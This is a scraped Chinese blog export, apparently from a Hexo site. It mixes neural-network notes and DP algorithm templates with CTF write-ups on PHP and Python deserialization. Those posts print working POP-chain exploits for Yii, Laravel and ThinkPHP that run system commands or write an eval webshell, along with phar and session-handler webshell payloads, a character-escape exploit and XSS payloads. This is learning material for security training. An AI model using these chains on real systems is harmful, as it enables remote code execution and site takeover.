恒等函数和softmax函数恒等函数会将输入按原样输出，对于输入的信息，不加以任何改动地直接输出。 softmax函数： 表示假设输出层共有$n$个神经元，计算第$k$个神经元的输出$y_k$ 函数实现 12345def softmax(a): exp_a = np.exp(a) sum_exp_a = np.sum(exp_a) y = exp_a / sum_exp_a return y softmax函数的改进 式7说明，在进行softmax的指数函数的运算时，加上（或者减去） 某个常数并不会改变运算的结果。这里的$C’ $可以使用任何值，但是为了防止溢出，一般会使用输入信号中的最大值。 改进型softmax 123456def softmax(a): c = np.max(a) exp_a = np.exp(a - c) # 溢出对策 sum_exp_a = np.sum(exp_a) y = exp_a / sum_exp_a return y softmax函数的输出是0.0到1.0之间的实数。并且，softmax 函数的输出值的总和是1。输出总和为1是softmax函数的一个重要性质。所以，输出结果才能被解释为“概率”。 特征量：是指可以从输入数据（输入图像）中准确地提取本质数据（重要的数据）的转换器。图像的特征量通常表示为向量的形式。 过拟合：可以顺利地处理某个数据集，但无法处理其他数据集的情况 损失函数神经网络以某个指标为线索寻找最优权重参数。神经网络的学习中所用的指标称为损失函数。这个损失函数可以使用任意函数， 但一般用均方误差和交叉熵误差等 均方误差 这里，yk是表示神经网络的输出，t_k表示监督数据，k表示数据的维数。 实现 123def mean_squared_error(y, t): return 0.5 * np.sum((y-t)**2)# y是softmax函数的输出，t是监督数据 交叉熵误差 正确解标签对应的输出越大，式9的值越接近0；当输出为1时，交叉熵误差为0。 实现 123def cross_entropy_error(y, t): delta = 1e-7 return -np.sum(t * np.log(y + delta)) 上述代码加上了一 个微小值delta，这是因为当出现 np.log(0) 时，np.log(0) 会变为负无限大的 -inf，这样一来就会导致后续计算无法进行。 Mini-batch实现交叉熵误差如果遇到大数据， 数据量会有几百万、几千万之多，这种情况下以全部数据为对象计算损失函数是不现实的。因此，我们从全部数据中选出一部分，作为全部数据的“近似”。这种学习方式称为mini-batch学习。 实现 1234567891011121314# one-hot形式：将正确解标签表示为1，其他标签表示为0的表示方法def cross_entropy_error(y, t): if y.ndim == 1: t = t.reshape(1, t.size) y = y.reshape(1, y.size) batch_size = y.shape[0] return -np.sum(t * np.log(y + 1e-7)) / batch_size# 标签形式：像“2”“7”这样的标签def cross_entropy_error(y, t): if y.ndim == 1: t = t.reshape(1, t.size) y = y.reshape(1, y.size) batch_size = y.shape[0] return -np.sum(np.log(y[np.arange(batch_size), t] + 1e-7)) / batch_size 反向传播“从左向右进行计算”是一种正方向上的传播，简称为正向传播。正向传播是从计算图出发点到结束点的传播。 既然有正向传播这个名称，当然也可以考虑反向（从图上看的话，就是从右向左）的传播。实际上，这种传播称为反向传播，反向传播将在接下来的导数计算中发挥重要作用。 如上图，反向传播从右向左传递导数的值（1 → 1.1 → 2.2）。从这个结果中可知，“支付金额关于苹果的价格的导数”的值是2.2。 加法层原封不动还给下游，而乘法层交叉相乘 ReLU层激活函数实现反向传播 在式10中，如果正向传播时的输入x大于0，则反向传播会将上游的值原封不动地传给下游。反过来，如果正向传播时的x小于等于0，则反向传播中传给下游的信号将停在此处。","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://sourcerev.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://sourcerev.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"神经网络","slug":"神经网络","permalink":"http://sourcerev.github.io/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"}]},{"title":"DP模板","slug":"algorithm_dp","date":"2022-11-10T18:23:56.000Z","updated":"2023-04-12T13:02:46.136Z","comments":true,"path":"2022/11/11/algorithm_dp/","link":"","permalink":"http://sourcerev.github.io/2022/11/11/algorithm_dp/","excerpt":"","text":"DP最长上升子序列基础模板12345678910111213141516171819202122232425262728//输入：a[N] 表示存储数据的数值，f[N]表示最长子序列的长度//输出：res表示双向求子序列的最长长度int res = 0;for (int i = 1; i &lt;= n; i ++) cin &gt;&gt; a[i];// 正向求解最长上升子序列for (int i = 1; i &lt;= n; i ++)&#123; f[i] = 1; for (int j = 1; j &lt; i; j ++) if (a[i] &gt; a[j]) &#123; f[i] = max(f[i], f[j] + 1); res = max(res, f[i]); &#125;&#125;// 反向求解最长上升子序列for (int i = n; i &gt; 0; i --)&#123; f[i] = 1; for (int j = n; j &gt; i; j --) if (a[i] &gt; a[j]) &#123; f[i] = max(f[i], f[j] + 1); res = max(res, f[i]); &#125;&#125;cout &lt;&lt; res &lt;&lt; endl; 驼峰型子序列先上升再下降 1234567891011121314151617181920212223//输入：a[N] 表示存储数据的数值，f1[N]表示最长上升子序列的长度，f2[N]表示下降子序列//输出：res表示最长长度int n,res = 0;cin &gt;&gt; n;for(int i = 1; i &lt;= n; i ++) cin &gt;&gt; a[i];for(int i = 1; i &lt;= n; i ++)&#123; f1[i] = 1; for (int j = 1;j &lt; i; j ++) if (a[i] &gt; a[j]) f1[i] = max(f1[i], f1[j] + 1);&#125;for(int i = n; i &gt; 0; i --)&#123; f2[i] = 1; for(int j = n; j &gt; i; j --) if (a[i] &gt; a[j]) f2[i] = max(f2[i], f2[j] + 1);&#125;for(int i = 1; i &lt;= n; i ++) res = max(res, f1[i] + f2[i] - 1);cout &lt;&lt; res; y&#x3D;ax+b型如果满足二维的线性关系可以用此模板求最长上升子序列 123456789101112131415161718//输入：f[N]表示最长上升子序列的长度//输出：res表示最长长度typedef pair &lt;int, int&gt; pii; // 存储x和yint n,res = 0;cin &gt;&gt; n;for(int i = 1; i &lt;= n; i ++) scanf(&quot;%d%d&quot;, &amp;q[i].first,&amp;q[i].second);sort(q+1, q + n + 1);for(int i = 1; i &lt;= n; i ++)&#123; f[i] = 1; for(int j = 1; j &lt; i; j ++) if(q[i].second &gt; q[j].second) f[i] = max(f[i], f[j] + 1); res = max(res, f[i]);&#125;cout &lt;&lt; res; 求最长上升子序列覆盖原序列贪心流程; 从前往后扫描每个数，对于每个数: 如果现有的子序列的结尾都小于当前数，则创建新子序列; 将当前数放到结尾大于等于它的最小的子序列后面; 1234567891011//输入：g[N]表示每段上升子序列尾部的值，用k遍历g数组来判断是否需要添加数据//输出：cnt表示需要多少段int cnt = 0;for(int i = 1; i &lt; n; i ++)&#123; int k = 0; while(k&lt;cnt&amp;&amp;g[k]&lt;a[i]) k ++; g[k] = a[i]; if(k &gt;= cnt) cnt ++;&#125;cout &lt;&lt; cnt; 背包问题完全背包可以选择第 i 个物品 n 次 思路： 状态表示 集合： f[i][j] 表示前 i 个物品中选择体积为 j 的方案数 属性：方案数的个数 状态转移 优化可得 1234f[0] = 1;for (int i = 1; i &lt;= n; ++ i) for (int j = v[i]; j &lt;= m; ++ j) f[j] += f[j - v[i]]; 背包的方案数状态表示 g(i,j) 集合： 考虑前 i 个物品，当前已使用体积恰好是 j 的，且 价值为最大的方案 属性： 方案的数量 Sum 123456789101112131415161718g[0] = 1;for (int i = 1; i &lt;= n; i ++)&#123; for (int j = m; j &gt;= v[i]; j --) &#123; int temp = max(f[j], f[j - v[i]] + w[i]), c = 0; if (temp == f[j]) c = (c + g[j]) % mod; if (temp == f[j - v[i]] + w[i]) c = (c + g[j - v[i]]) % mod; f[j] = temp, g[j] = c; &#125;&#125;int res = 0;for (int i = 0; i &lt;= m; i ++)&#123; if (f[i] == f[m]) res = (res + g[i]) % mod;&#125;cout &lt;&lt; res; 背包的方案数（字典序最小）我们先做一遍正常的背包DP ，然后从目标状态倒推回初始状态的整个转移路径即可，这样在抉择时，如果出现分叉转移，我们就优先选当前物品即可 12345678910111213141516for (int i = n; i &gt;= 1; i --) for (int j = 0; j &lt;= m; j ++) &#123; f[i][j] = f[i + 1][j]; if (j &gt;= v[i]) f[i][j] = max(f[i][j], f[i + 1][j - v[i]] + w[i]); &#125; for (int i = 1, j = m; i &lt;= n; i ++)&#123; if (j &gt;= v[i] &amp;&amp; f[i][j] == f[i + 1][j - v[i]] + w[i]) &#123; path[cnt ++] = i; j -= v[i]; &#125;&#125;for (int i = 0; i &lt; cnt; i ++) cout &lt;&lt; path[i] &lt;&lt; &quot; &quot;; 能量石问题物品的价值会随着时间的减少而逐渐减少 当上述式子满足时选择先选择$s_i$比$s_{i+1}$更划算 状态表示 集合：f[i][j]表示前i个物品中吃消耗的时间恰好为j所获得的能量的集合 属性：max 状态计算 选则吃掉i： 不选择吃掉i： 1234567891011121314151617181920212223242526272829303132333435struct Stone&#123; int s, e, l; bool operator&lt; (const Stone &amp;W) const &#123; return s * W.l &lt; W.s * l; &#125;&#125;Stones[N];int main(void)&#123; int t, cnt = 0; cin &gt;&gt; t; while (t --) &#123; int n, m = 0; // m表示花费的总时间 cin &gt;&gt; n; memset(f, -0x3f, sizeof f); f[0] = 0; for (int i = 0; i &lt; n; i ++) &#123; cin &gt;&gt; Stones[i].s &gt;&gt; Stones[i].e &gt;&gt; Stones[i].l; m += Stones[i].s; &#125; sort(Stones, Stones + n); for (int i = 0; i &lt; n; i ++) for (int j = m; j &gt;= Stones[i].s; j --) f[j] = max(f[j], f[j - Stones[i].s] + Stones[i].e - (j - Stones[i].s) * Stones[i].l); int res = 0; for (int i = 0; i &lt;= m; i ++) res = max(res, f[i]); cnt ++; printf(&quot;Case #%d: %d\\n&quot;, cnt, res); &#125;&#125;","categories":[{"name":"ACM","slug":"ACM","permalink":"http://sourcerev.github.io/categories/ACM/"}],"tags":[{"name":"DP","slug":"DP","permalink":"http://sourcerev.github.io/tags/DP/"}]},{"title":"python反序列化","slug":"unserialize4","date":"2022-10-18T15:23:56.000Z","updated":"2023-04-12T12:23:34.637Z","comments":true,"path":"2022/10/18/unserialize4/","link":"","permalink":"http://sourcerev.github.io/2022/10/18/unserialize4/","excerpt":"","text":"反序列化–pythonpickle反序列化漏洞pickle 或 cPickle ，作用和 PHP的serialize 与 unserialize 一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同，但cPickle库的性能更好。 函数 说明 dumps 对象反序列化为bytes对象 dump 对象反序列化到文件对象，存入文件 loads 从bytes对象反序列化 load 对象反序列化，从文件中读取数据 反序列化漏洞出现在 __reduce__()魔法函数上，这一点和PHP中的__wakeup()魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。而这恰好是反序列化漏洞经常出现的地方。 而且在反序列化过程中，因为编程语言需要根据反序列化字符串去解析出自己独特的语言数据结构，所以就必须要在内部把解析出来的结构去执行一下。如果在反序列化过程中出现问题，便可能直接造成RCE漏洞. 另外pickle.loads会解决import问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数都可以进行使用。 当 __reduce__()函数返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用 . 第二个元素是可调用对象的参数 , 同样是一个元组。 在python2中只有内置类才有__reduce__方法，即用class A(object)声明的类，而python3中已经默认都是内置类了 phar反序列化 PHP反序列化常见的是使用unserilize()进行反序列化，除此之外还有其它的反序列化方法，不需要用到unserilize()。 phar是将php文件打包而成的一种压缩文档，类似于Java中的jar包。它有一个特性就是phar文件会以序列化的形式储存用户自定义的 meta-data 。以扩展反序列化漏洞的攻击面，配合 phar:// 协议使用。 通用生成phar脚本 123456789&lt;?php $a=new filter(&#x27;;tac fla?.???&#x27;,&#x27;1&#x27;); $a-&gt;admin = true; $a-&gt;evilfile = true; $phar = new Phar(&#x27;1.phar&#x27;); $phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;); $phar-&gt;setMetadata($a); $phar-&gt;addFromString(&#x27;1.txt&#x27;,&#x27;dky&#x27;);?&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://sourcerev.github.io/categories/CTF/"}],"tags":[{"name":"web","slug":"web","permalink":"http://sourcerev.github.io/tags/web/"},{"name":"反序列化","slug":"反序列化","permalink":"http://sourcerev.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"pickle","slug":"pickle","permalink":"http://sourcerev.github.io/tags/pickle/"}]},{"title":"模板的反序列化","slug":"unserialize3","date":"2022-10-07T01:23:56.000Z","updated":"2023-04-12T12:23:23.676Z","comments":true,"path":"2022/10/07/unserialize3/","link":"","permalink":"http://sourcerev.github.io/2022/10/07/unserialize3/","excerpt":"","text":"反序列化–模板漏洞Yii利用链1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpnamespace yii\\rest &#123; class Action &#123; public $checkAccess; &#125; class IndexAction &#123; public function __construct($func, $param) &#123; $this-&gt;checkAccess = $func; $this-&gt;id = $param; &#125; &#125;&#125;namespace yii\\web &#123; abstract class MultiFieldSession &#123; public $writeCallback; &#125; class DbSession extends MultiFieldSession &#123; public function __construct($func, $param) &#123; $this-&gt;writeCallback = [new \\yii\\rest\\IndexAction($func, $param), &quot;run&quot;]; &#125; &#125;&#125;namespace yii\\db &#123; use yii\\base\\BaseObject; class BatchQueryResult &#123; private $_dataReader; public function __construct($func, $param) &#123; $this-&gt;_dataReader = new \\yii\\web\\DbSession($func, $param); &#125; &#125;&#125;namespace &#123; $exp = new \\yii\\db\\BatchQueryResult(&#x27;shell_exec&#x27;, &#x27;echo &quot;&lt;?php eval(\\$_POST[1]);phpinfo();?&gt;&quot; &gt;/var/www/html/basic/web/1.php&#x27;); echo(base64_encode(serialize($exp)));&#125;?&gt; 可以用此链执行文件写入操作 Laravel模板漏洞1. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpnamespace Illuminate\\Foundation\\Testing&#123; class PendingCommand&#123; protected $command; protected $parameters; protected $app; public $test; public function __construct($command, $parameters,$class,$app)&#123; $this-&gt;command = $command; $this-&gt;parameters = $parameters; $this-&gt;test=$class; $this-&gt;app=$app; &#125; &#125;&#125;namespace Illuminate\\Auth&#123; class GenericUser&#123; protected $attributes; public function __construct(array $attributes)&#123; $this-&gt;attributes = $attributes; &#125; &#125;&#125;namespace Illuminate\\Foundation&#123; class Application&#123; protected $hasBeenBootstrapped = false; protected $bindings; public function __construct($bind)&#123; $this-&gt;bindings=$bind; &#125; &#125;&#125;namespace&#123; $genericuser = new Illuminate\\Auth\\GenericUser( array( &quot;expectedOutput&quot;=&gt;array(&quot;0&quot;=&gt;&quot;1&quot;), &quot;expectedQuestions&quot;=&gt;array(&quot;0&quot;=&gt;&quot;1&quot;) ) ); $application = new Illuminate\\Foundation\\Application( array( &quot;Illuminate\\Contracts\\Console\\Kernel&quot;=&gt; array( &quot;concrete&quot;=&gt;&quot;Illuminate\\Foundation\\Application&quot; ) ) ); $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand( &quot;system&quot;,array(&#x27;cat /flag&#x27;), $genericuser, $application ); echo urlencode(serialize($pendingcommand));&#125;?&gt; 2. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpnamespace Illuminate\\Broadcasting&#123; use Illuminate\\Bus\\Dispatcher; use Illuminate\\Foundation\\Console\\QueuedCommand; class PendingBroadcast &#123; protected $events; protected $event; public function __construct()&#123; $this-&gt;events=new Dispatcher(); $this-&gt;event=new QueuedCommand(); &#125; &#125;&#125;namespace Illuminate\\Foundation\\Console&#123; use Mockery\\Generator\\MockDefinition; class QueuedCommand &#123; public $connection; public function __construct()&#123; $this-&gt;connection=new MockDefinition(); &#125; &#125;&#125;namespace Illuminate\\Bus&#123; use Mockery\\Loader\\EvalLoader; class Dispatcher &#123; protected $queueResolver; public function __construct()&#123; $this-&gt;queueResolver=[new EvalLoader(),&#x27;load&#x27;]; &#125; &#125;&#125;namespace Mockery\\Loader&#123; class EvalLoader &#123; &#125;&#125;namespace Mockery\\Generator&#123; class MockConfiguration &#123; protected $name=&quot;feng&quot;; &#125; class MockDefinition &#123; protected $config; protected $code; public function __construct() &#123; $this-&gt;code=&quot;&lt;?php system(&#x27;cat /flag&#x27;);exit()?&gt;&quot;; $this-&gt;config=new MockConfiguration(); &#125; &#125;&#125;namespace&#123; use Illuminate\\Broadcasting\\PendingBroadcast; echo urlencode(serialize(new PendingBroadcast()));&#125; thinkphp模板漏洞1. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;?phpnamespace think\\process\\pipes&#123; use think\\model\\Pivot; class Windows &#123; private $files = []; public function __construct()&#123; $this-&gt;files[]=new Pivot(); &#125; &#125;&#125;namespace think&#123; abstract class Model &#123; protected $append = []; private $data = []; public function __construct()&#123; $this-&gt;data=array( &#x27;Ki1ro&#x27;=&gt;new Request() ); $this-&gt;append=array( &#x27;Ki1ro&#x27;=&gt;array( &#x27;hello&#x27;=&gt;&#x27;world&#x27; ) ); &#125; &#125;&#125;namespace think\\model&#123; use think\\Model; class Pivot extends Model &#123; &#125;&#125;namespace think&#123; class Request &#123; protected $hook = []; protected $filter; protected $config = [ // 表单请求类型伪装变量 &#x27;var_method&#x27; =&gt; &#x27;_method&#x27;, // 表单ajax伪装变量 &#x27;var_ajax&#x27; =&gt; &#x27;&#x27;, // 表单pjax伪装变量 &#x27;var_pjax&#x27; =&gt; &#x27;_pjax&#x27;, // PATHINFO变量名 用于兼容模式 &#x27;var_pathinfo&#x27; =&gt; &#x27;s&#x27;, // 兼容PATH_INFO获取 &#x27;pathinfo_fetch&#x27; =&gt; [&#x27;ORIG_PATH_INFO&#x27;, &#x27;REDIRECT_PATH_INFO&#x27;, &#x27;REDIRECT_URL&#x27;], // 默认全局过滤方法 用逗号分隔多个 &#x27;default_filter&#x27; =&gt; &#x27;&#x27;, // 域名根，如thinkphp.cn &#x27;url_domain_root&#x27; =&gt; &#x27;&#x27;, // HTTPS代理标识 &#x27;https_agent_name&#x27; =&gt; &#x27;&#x27;, // IP代理获取标识 &#x27;http_agent_ip&#x27; =&gt; &#x27;HTTP_X_REAL_IP&#x27;, // URL伪静态后缀 &#x27;url_html_suffix&#x27; =&gt; &#x27;html&#x27;, ]; public function __construct()&#123; $this-&gt;hook[&#x27;visible&#x27;]=[$this,&#x27;isAjax&#x27;]; $this-&gt;filter=&quot;system&quot;; &#125; &#125;&#125;namespace&#123; use think\\process\\pipes\\Windows; echo base64_encode(serialize(new Windows()));&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://sourcerev.github.io/categories/CTF/"}],"tags":[{"name":"web","slug":"web","permalink":"http://sourcerev.github.io/tags/web/"},{"name":"反序列化","slug":"反序列化","permalink":"http://sourcerev.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"Yii模板","slug":"Yii模板","permalink":"http://sourcerev.github.io/tags/Yii%E6%A8%A1%E6%9D%BF/"},{"name":"Laravel","slug":"Laravel","permalink":"http://sourcerev.github.io/tags/Laravel/"}]},{"title":"简单的反序列化","slug":"unserialize2","date":"2022-09-16T05:23:56.000Z","updated":"2023-04-12T12:23:12.437Z","comments":true,"path":"2022/09/16/unserialize2/","link":"","permalink":"http://sourcerev.github.io/2022/09/16/unserialize2/","excerpt":"","text":"反序列化–存储方式与字符逃逸首先，我们需要明白 session 是什么：简单来说$_SESSION是访客与整个网站交互过程中一直存在的公有变量 session的存储方式php.ini 中储存三种配置选项 session.save_path=&quot;&quot; ：设置session的存储路径 session.save_handler=&quot;&quot; ：设定用户自定义session存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式) session.auto_start boolen ：指定会话模块是否在请求开始时启动一个会话，默认为0不启动 session.serialize_handler string ：定义用来序列化&#x2F;反序列化的处理器名字。默认使用php (php&lt;5.5.4) 引擎除了配置选项之外，php使用过程中还有php引擎需要设置，不同引擎设置的session存储方式不同 引擎 session存储方式 php &lt; 5.5.4 存储方式：键名+竖线 php_serialize (php &lt; 5.5.4) 存储方式：serialize()处理后的键和值 php_binary 存储方式：键名长度对应的ASCII字符+键名+serialize()处理过后的值 而设置引擎所需要 ini_set() 函数 例题 ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); 123456789&lt;?phpsession_start();ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);class User&#123; public $a=&quot;admin&quot;;&#125;$user=new User();$_SESSION[&#x27;user&#x27;]=$user;//结果为：user|O:4:&quot;User&quot;:1:&#123;s:1:&quot;a&quot;;s:5:&quot;admin&quot;;&#125; ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;); 123456789&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();class User&#123; public $a=&quot;admin&quot;;&#125;$user=new User();$_SESSION[&#x27;user&#x27;]=$user;//结果为：a:1:&#123;s:4:&quot;user&quot;;O:4:&quot;User&quot;:1:&#123;s:1:&quot;a&quot;;s:5:&quot;admin&quot;;&#125;&#125; 这两种方式中以 php 作为存储方式是以 | 作为分隔符，右边则是序列化的内容，可以通过构造payload上传木马文件 12345678910111213141516171819# inc.php# 设置处理方式为默认的php处理方式ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);# 可以构造恶意参数的代码class User&#123; public $username; public $password; public $status; function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function setStatus($s)&#123; $this-&gt;status=$s; &#125; function __destruct()&#123; file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;)); &#125;&#125; 此时可以构造恶意payload 12345678910111213141516171819&lt;?phpsession_start();class User&#123; public $username; public $password; public $status; function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function setStatus($s)&#123; $this-&gt;status=$s; &#125;&#125;# 一句话木马写长一些，以免发生未知错误$user=new User(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;);echo base64_encode(&#x27;|&#x27;.serialize($user));# fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQ==?&gt; 准备工作大致到这里就结束了，接下来的解题步骤 在 index.php 中修改 limit 的 cookie 值，刷新界面写入木马 登入 check.php?u=admin&amp;pass=123 ，用回显来判断是否写入成功 登入 log-1.php ，post执行操作获取flag xampp组件 session.save_path=&quot;/tmp&quot; ：表明所有的session文件都是存储在 /tmp 下 session.save_handler=files ：表明session是以文件的方式来进行存储的 session.auto_start=0 ：表明默认不启动session session.serialize_handler=php ：表明session的默认序列化引擎使用的是php序列话引擎 字符逃逸问题extractextract 函数的作用是将键的值赋值给变量 12345678910&lt;?php /* 假定 $var_array 是 wddx_deserialize 返回的数组*/ $size = &quot;large&quot;; $var_array = array(&quot;color&quot; =&gt; &quot;blue&quot;, &quot;size&quot; =&gt; &quot;medium&quot;, &quot;shape&quot; =&gt; &quot;sphere&quot;); extract($var_array, EXTR_PREFIX_SAME, &quot;wddx&quot;); echo &quot;$color, $size, $shape, $wddx_size\\n&quot;;?&gt; # blue, large, sphere, medium extract($_POST) 就是将post的内容作为这个函数的参数，同时将$_SESSION的值替换为$_POST的值 str_replacestr_replace 函数也可以造成序列化的字符逃逸问题 例题：ctfshow web264123456789101112131415161718192021222324252627282930# index.php&lt;?php error_reporting(0);session_start();class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;$f = $_GET[&#x27;f&#x27;];$m = $_GET[&#x27;m&#x27;];$t = $_GET[&#x27;t&#x27;];if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123; $msg = new message($f,$m,$t); $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg)); $_SESSION[&#x27;msg&#x27;]=base64_encode($umsg); echo &#x27;Your message has been sent&#x27;;&#125;highlight_file(__FILE__);?&gt; 12345678910111213141516171819202122232425# message.php&lt;?php session_start();highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; $msg = unserialize(base64_decode($_SESSION[&#x27;msg&#x27;])); if($msg-&gt;token==&#x27;admin&#x27;)&#123; echo $flag; &#125;&#125;?&gt; 分析代码可知只有当 token &#x3D; ‘admin’ 的时候才能拿到flag，每次替换就可以逃逸一个字符，我们一共需要逃逸27个字符，exp如下 123456789101112131415161718192021&lt;?phpclass message&#123; public $from; public $msg; public $to; public $token=&#x27;admin&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;# 需要做到：&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; 可以闭合$f = &#x27;a&#x27;;$m = &#x27;b&#x27;;$t = &#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&#x27;;$msg= serialize(new message($f,$m,$t));$umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, $msg);echo serialize($umsg);# s:232:&quot;O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:108:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;?&gt; 构造payload 1?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; 反序列化内置类如果题目中不存在pop链的反序列化的题目，那么就是找到php内置类来进行反序列化。 toString方法__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串。 例如： 123456789101112131415161718192021&lt;?php class Person &#123; public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex=&#x27;男&#x27;) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; public function __toString() &#123; return &#x27;go go go&#x27;; &#125; &#125; $person = new Person(&#x27;小明&#x27;); // 初始赋值 echo $person;?&gt;# go go go ERROR类Error类就是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个toString的方法。 1234&lt;?php $a = unserialize($_GET[&#x27;yds&#x27;]); echo $a; ?&gt; 此时就可以通过ERROR类构造反序列化的exp 12345&lt;?php $a = new Error(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;); $b = serialize($a); echo urlencode($b); ?&gt; EXCEPTION适用于php5、7版本，而这个类利用的方式和原理和Error 类一模一样。 1234&lt;?php $a = unserialize($_GET[&#x27;yds&#x27;]); echo $a; ?&gt; 构造exp 1234&lt;?php $a = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;); echo urlencode(serialize($a));?&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://sourcerev.github.io/categories/CTF/"}],"tags":[{"name":"web","slug":"web","permalink":"http://sourcerev.github.io/tags/web/"},{"name":"反序列化","slug":"反序列化","permalink":"http://sourcerev.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"初识反序列化","slug":"unserialize1","date":"2022-09-15T04:00:00.000Z","updated":"2023-04-12T12:23:00.291Z","comments":true,"path":"2022/09/15/unserialize1/","link":"","permalink":"http://sourcerev.github.io/2022/09/15/unserialize1/","excerpt":"","text":"反序列化序列化和反序列化的概念在各类语言中，将对象的状态信息转换为可储存或可传输的过程就是序列化，而其逆过程就是反序列化 bool : b:value &#x3D;&gt; b:0 int : i:value &#x3D;&gt; i:1 str : s:length:”value” &#x3D;&gt; s:4:”aaaa” array : a:&lt;length&gt;:{key,value pairs}; &#x3D;&gt; a:1:{i:1,s:1:”a”} object : O:: NULL型 : N 而最终的序列化形式为 &lt;class_name&gt;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;; 例如： 12345678910O:3:&quot;Ctf&quot;:3&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示3 代表类名字占三个字符 ctf 类名3 代表三个属性s代表字符串4代表属性名长度flag属性名s:13:&quot;flag&#123;abedyui&#125;&quot; 字符串 属性值长度 属性值 利用思路：PHP中存在魔法方法，可以自身调用 常见的魔法函数： 1234567__construct() 创建对象时调用__destruct() 销毁对象时调用__toString() 当一个对象被当作一个字符串使用__sleep() 在对象在被序列化之前运行__wakeup() 将在序列化之后立即被调用__call() 反序列化恢复对象前调用__get() 从不可访问的属性读取数据 绕过__wakeup()原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。 